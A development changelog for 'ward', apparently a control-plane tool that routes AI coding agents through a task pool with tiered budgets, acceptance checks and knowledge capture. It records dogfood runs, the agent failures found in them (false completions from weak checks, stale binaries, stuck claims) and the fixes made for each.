### Shipped

- **`ward task run <id>` — the execution bridge (broker.md §4).** One command:
  generate workflow → engine execute → auto-capture on success → close task as
  done; on rejection, release one tier higher into the pool (FailTask); on
  `awaiting_approval`, keep the claim + print resume hint. Requires claimed
  state (`open` errors with "pull it first"). The small agent's whole loop is
  now: `brief` → `task next --by me --max-tier B` → `task run <id>` → repeat →
  `memory handoff`. Tests: `TestTaskRunCompletesAndCaptures`,
  `TestTaskRunFailureReleasesAtHigherFloor`, `TestTaskRunRequiresClaimedTask`.
- **Brief surfaces the task pool.** Open tasks (id/floor/title) in human +
  JSON output; next-actions direct budget holders to `task next`. An agent that
  follows AGENTS.md alone cannot miss work.
- **Agent protocol block v2** (marker `ward:protocol v2`). Adds the pool loop
  ("WORK FROM THE POOL", never retry failed tasks yourself) and the dossier
  pointer. Marker detection is now by PREFIX (`<!-- ward:protocol`), so older
  v1-marked files refresh in place instead of duplicating blocks. Test:
  `TestUpsertAgentBlockUpgradesOlderVersions`.
- **`scripts/sandbox.sh`.** Repeatable dogfood sandbox: scratch Go project,
  ward store, protocol injection, and five seeded tasks — four pass at
  cheap/mid floors (capture → cheap-reuse data), one doomed to fail through the
  full escalation chain into rejection + dossier. Usage printed at the end;
  the agent gets ONE instruction line.

### Validated end-to-end (manual dry run, /tmp/wsb)

brief showed the pool → cheap pull → task run completed+captured (3 verified
artifacts after sweep) → doomed task pulled cheap, rejected by the engine after
cheap→mid→strong, re-entered the pool at floor mid with dossier written →
next brief reflected everything.

### Decisions recorded (open items closed)

- Agent registry: pull-time `--max-tier` stands; revisit when ≥2 agents poll
  the same store routinely under stable identities (broker.md).
- Verify TTL: verify-on-session-start replaces TTL demotion entirely; revisit
  only if full-sweep cost ever exceeds staleness risk (verification.md).

### Simulation protocol (how to run the dogfood session)

1. `go build -o ward-bin . && ./scripts/sandbox.sh /tmp/ward-sim`
2. Spawn the smaller agent in that directory with one line:
   "You are <name>, budget <tier>. Follow AGENTS.md exactly."
3. After the session: inspect `ward account`-style data via
   `routing_decisions` (`ward explain <run> <node>`), captures (`memory list`),
   drift/escalations (`tick`), dossiers (`reject <run>`), and the pool state.
   Evidence of thesis: verified artifacts routing subsequent runs cheap;
   doomed work terminating in a dossier rather than looping.

## v0.5.y — dogfood session on secure-bank: findings and fixes (2026-08-22)

Ran the real thing instead of a toy sandbox: five opencode sessions
(hy3-free / mimo-v2.5-free / nemotron-3-ultra-free as cheap/mid/strong)
executed the ward protocol on `../secure-bank`, seeded with five REAL tasks
(gaps read from the codebase, acceptance checks in `run:`).

### Data generated (store: secure-bank/.ward)

- 4 tasks closed done with real landed code, committed per task with agent +
  model attribution: `/healthz` endpoint (cheap/hy3), suite-green confirmation
  (cheap/hy3), `TestStatement` coverage — 41 lines, 4 cases (mid/mimo),
  mandate idempotency + `TestMandateIdempotency` (strong/nemotron, resumed
  after an interrupted session).
- 1 BLOCKED task honestly bounced: webhook-on-tick failed its check at every
  tier, engine rejected after 3 attempts, task re-entered pool at floor mid,
  dossier written. No invented work.
- Store end state: 8 accepted artifacts, 6 verified; routing_decisions carry
  honest miss→mid and hit→cheap paths; observed-file logs match actual diffs.

### Findings (each fixed in ward same-day)

1. **Stale-binary drift.** The first small agent couldn't find `ward` on PATH,
   hunted, found an OLD build in /tmp, and silently followed it (commands were
   no-ops). Protocol output must be self-identifying.
   **Fix:** `brief` now prints `ward <version> | store: <path>`; explicit
   `ward version` subcommand (cobra only wires `--version`; agents type the
   subcommand); ward installed at a real PATH location.
2. **Cross-task capture vouching (thesis violation).** All generated task
   workflows named their node `work`, so every task's capture shared one tag;
   unrelated verified captures (healthz, statement test) counted as verified
   context for a mandate-idempotency node — routing it CHEAP on false
   evidence. Compounded by a weak acceptance check (`grep IdempotencyKey`
   matched pre-existing transfer code): atlas-1 "completed" without touching
   mandates. **The audit surface caught it**: `explain` listed irrelevant
   evidence; observed-files showed zero source changes vs empty `git diff`.
   **Fixes:** per-task node ids (`work-<taskID>`) so tags never collide across
   tasks (orchestration.TaskWorkflow); false capture superseded with honest
   reason; task re-seeded with a FALSIFIABLE check (`go test -run
   TestMandateIdempotency`) — lesson: acceptance checks must fail before the
   work exists.
3. **Dead-session claim wedge.** atlas-2 died mid-task; its claimed item was
   stuck forever (tasks had no recovery path).
   **Fix:** `ward task take <id> --by <agent>` transfers/acquires claims
   explicitly; done/rejected tasks are not takeable. Test:
   `TestTaskTakeRecoversDeadSessionClaim`.

### Lessons for authoring pool tasks

- The acceptance check IS the specification. It must be impossible to satisfy
  without the deliverable (prefer "a test named X passes" over grepping for
  identifiers that may already exist).
- One concept per task; strong-floor tasks need their test named in the title.
- Blocked work belongs in the pool too — it generates honest escalation data
  and terminates in a dossier instead of fake success.

### State

secure-bank HEAD carries four ward-pooled commits. Pool: one open task
(webhook, floor mid, blocked) awaiting a human decision or receiver URL.
Ward fixes committed alongside this entry.

## v0.5.z — parallel fleet on donate-fair: the architect pattern works (2026-08-23)

The intended usage finally exercised as designed: ARCHITECT decomposes and
budgets, THREE small-model engineers work the pool SIMULTANEOUSLY, ward is the
control plane.

### How it ran

- Architect seeded three tasks with tier floors + deliberately DISJOINT file
  scopes (backend/app+tests vs frontend vs new test file) — scope separation is
  decomposition discipline, the architect's job.
- Three `opencode run` processes launched in parallel with ONE-LINE prompts
  ("read AGENTS.md and follow it"); budgets cheap/mid/mid. No step choreography.
- Atomic claims decided who got what; two mid engineers landed real work:
  `/stats` endpoint + test (engineer-a), DLQ failure-injection test
  (engineer-b). 17 tests green at close.

### Findings (4th–6th)

4. **Honest bounce under partial work.** scout-a (cheap) implemented half the
   frontend task, its check refused closure, and per protocol it released
   instead of retrying — exactly right. But escalation semantics conflate "too
   hard" with "unfinished": the bump to strong was meaningless because the
   remaining delta was one line. Escalation is a re-budgeting signal, not a
   difficulty measurement; the architect adjudicates.
5. **Architect-authored check bug (#2 redux).** `grep '#legs'` demanded a
   literal hash; HTML writes `id="legs"`. Two agents were bounced by a WRONG
   check. Fixed by dropping and re-seeding with a correct falsifiable check;
   closed via take+run. Rule reinforced: the architect must dry-run their own
   checks before seeding.
6. **Baseline before launch.** donate-fair's tree arrived with an entire
   uncommitted pivot; repo-wide observed-file logs then blurred agent
   attribution (shared working tree — worktree isolation would fix attribution
   AND concurrency, revisit wish 03 when fleets grow).

### Ward changes shipped in this entry

- Protocol block v3: pool work is now an explicit LOOP ("work until nothing is
  left within your budget"), plus `task take` recovery guidance — enables true
  one-line session handoff.
- `ward task drop <id>`: human kill switch for blocked/obsolete work so it
  stops haunting every future brief (the webhook task haunted secure-bank's
  pool until dropped).
- Tests: TestTaskTakeRecoversDeadSessionClaim; suite green.

### Control-plane data (donate-fair/.ward)

Concurrent store access from three processes without a single SQLITE_BUSY
failure (WAL + busy_timeout held); atomic claim contention resolved correctly;
captures verified on next brief; pool drained to empty within budgets.

## v0.6 — R&D loop: explorers propose, architect evaluates (2026-08-23)

Ported chef `rd-001` and extended it with the feed chef never had: ward's own
telemetry. Spec: `.spec/research.md`.

### Shipped

- **`ward harvest`** (`internal/cli/harvest.go`): the R&D data spine — tier
  distribution, cheap+verified rate (the thesis metric), tasks by status,
  bounce leaders (authoring suspects), knowledge reuse, drift counts, dossier
  themes. Observer-only; human + `--json`. Test: `TestHarvestReportsTelemetry`.
- **Explorer protocol** (spec, no code needed): explorers propose via
  `memory put --ceremony full --by rd-explorer --tags rd:<topic>` (stays
  `proposed`, never auto-accepted); architect records verdicts via
  promote/supersede with reasons. Every lifecycle primitive already existed —
  the loop is a discipline, now written down.
- Spec index gains `research.md`.

### Proven end-to-end on donate-fair

Explorer (hy3-free) proposed 2 artifacts on "acceptance checks" without
duplicating store knowledge and without crossing the gate. Architect verdicts:
`fb735d08` PROMOTED (fair_allocate invariant checklist — directly addresses
our bounced-task check-authoring problem), `da528705` SUPERSEDED with
merge-reason (hypothesis dependency too heavy). Trail greppable via
`memory list --status superseded` + get.

### First harvest readings (real stores)

secure-bank: cheap+verified 17% of 35 decisions (thesis metric low because
most nodes run once; captures verified only help repeat work) — bounce leader
was the blocked webhook task. donate-fair: 0% cheap (single-run nodes),
bounce-free after wave-1 adjudication.

## v0.7 — brain-to-chip: `ward skill` compiles knowledge into agent skills (2026-08-23)

The loop's missing last mile. Chef's rd-001 stopped at evaluated knowledge in
the store; agents don't read stores — they load skill files. Ward now compiles
gated knowledge into pluggable chips (inspired by codex-spec-master-skills'
SKILL.md format, but DERIVED, not hand-written). Spec: `.spec/skills.md`.

### Shipped

- **`ward skill pack <topic>`** — compiles accepted artifacts (tag/search
  match) into `.opencode/skills/<ward-chip>/SKILL.md`: loader-compatible
  frontmatter, body grouped by kind (Procedures / Field notes / Watch out /
  Background), sources table as in-chip audit trail.
- **`ward skill check <chip-dir>`** — staleness detector: re-reads every
  source id against live store state; superseded/stale/error sources ⇒ STALE.
- **Gate travels with the chip**: captures need live verification;
  verdict-knowledge needs promotion. `--include-unverified` relaxes with an
  explicit `[UNVERIFIED]` marker — evidence classes never mix silently.
- Test: `TestSkillPackGateAndStaleness` (gate holds; staleness flips).

### Proven on donate-fair's real brain

`rd:checks` chip compiled from the promoted invariant checklist; drift drill
(supersede → check=STALE naming the source) then successor artifact promoted
→ repack → FRESH. Chips are caches of the brain: hand-editing them is
pointless by construction.

### Full loop now closed

harvest finds gap → explorer proposes (proposed) → architect promotes
(accepted) → skill pack compiles (chip) → agents load it (cheap→sharp) →
sources drift → check says STALE → fix brain → repack → FRESH.

## Review-only session — adversarial pass over v0.5–v0.7 (2026-08-23)

Triggered by external review feedback: four consecutive scope expansions
(dispatch pool → protocol-v3 → harvest/explorer → skill compilation) shipped
without the write-spec-first-review-then-implement cycle; two spec domains
were declared Active unreviewed. This session ships NO features — only the
review's findings and their fixes.

### Defects found and fixed same-session

1. **Harvest violated the determinism contract.** Human output iterated Go
   maps (`Tiers`, `HitRate`) — identical stores produced shuffled lines run to
   run, against cli.md's "deterministic, parseable" rule. Fixed: fixed-order
   rendering.
2. **Explorer self-promotion was policy-only.** research.md guaranteed "no
   explorer artifact accepted without a verdict", but any process could type
   `--ceremony light` and auto-accept. Now enforced in `memory put`:
   `--by rd-explorer*` + light ceremony is a hard error.
3. **Task close dropped attribution.** `CompleteTask(id, by)` ignored `by` —
   any process could close any claimed task. Now holder-must-match; cross-
   closes are rejected with "take it first". Test updated to assert both
   directions.

### Hardening

4. Chip frontmatter: topics containing control characters can no longer break
   SKILL.md's YAML header (sanitized on render).

### Accepted risks, now written down instead of implicit

- **TakeTask has no age guard**: an active agent's claim can be stolen by
  anyone. Acceptable under the single-orchestrator trust domain; revisit with
  claim TTLs if fleets grow (same trigger as worktree isolation).
- **Chip topic matching uses FTS search**, not exact tag match — a loosely
  worded topic can pull tangential artifacts into a chip. Precision improves
  with tag conventions (`rd:<topic>`); exact-match mode deferred until it
  bites.
- **AllRoutingDecisions orders by created_at text**; same-second ties are
  nondeterministic across queries. Harmless for aggregates; noted for any
  future per-decision analytics.

### Process correction going forward

Spec domains ship as Draft, go through adversarial review, THEN flip Active.
Feature pushes pause when a review flags pacing — this entry is the pause.

## Simulation: the self-learning loop, measured end-to-end (2026-08-23, donate-fair wave-2)

First full cycle run as one continuous experiment rather than proven
piecemeal. Design: chip `ward-rd-checks` (promoted invariant checklist) was
already compiled; two real Phase-3 tasks were seeded whose acceptance checks
follow that standard; two mid engineers ran in parallel with one-line prompts;
a strong engineer completed bounced work; harvest before/after.

### What transferred (loop works)

- **Content learning is real.** wave2-a's property tests assert exactly the
  promoted checklist — conservation, floor, non-negativity, proportionality,
  degenerate inputs — unprompted beyond the task title. wave2-b proved the
  replay-exactly-once invariant first-run (no bounce). 27 tests green at close.
- Escalation-as-designed: bounced work re-entered at strong and was finished
  there, honestly.

### What did NOT transfer (honest scorecard)

- **Bounce rate unchanged** (1 bounce / 2 tasks this wave vs prior waves) —
  but the cause MOVED: no longer check-authoring quality (the chip's win),
  now process/infra failures.
- cheap_verified stayed 0%: single-run nodes never reuse knowledge. The thesis
  metric only moves with repeated work — a structural limitation to remember
  when reading that number.

### Loop defects discovered BY the simulation (recorded for review, not yet built)

- **L1 — premature verification burns the budget.** Agents run `task run`
  before implementing; "file not found" fails all 3 attempts and escalates a
  non-problem. Candidate fix (tiny): `task next` hint becomes "implement
  FIRST, then ward task run". Needs review like everything else.
- **L2 — verdict reasons aren't compilable knowledge.** da528705 was superseded
  with reason "hypothesis adds weight" — precisely the mistake wave2-a then
  made (added hypothesis anyway), because rejection reasons live in
  supersede_reasons where the chip compiler can't see them.
  Proposed amendment to research.md: when a rejection carries a transferable
  lesson, the architect ALSO writes it as a `feedback` artifact so it compiles
  into chips as a "Watch out" section.
- **L3 — dependency additions escape every gate**: requirements.txt changed
  unchecked by an engineer. Related to L2's lesson; candidate authoring rule
  for future tasks ("no new deps" or "deps are their own task").

### Verdict

The loop learns where knowledge is compilable and gated; it doesn't learn
where lessons hide in verdict prose or process habits. The next unit of work
on ward itself is therefore spec amendments for L1/L2 — through review first.

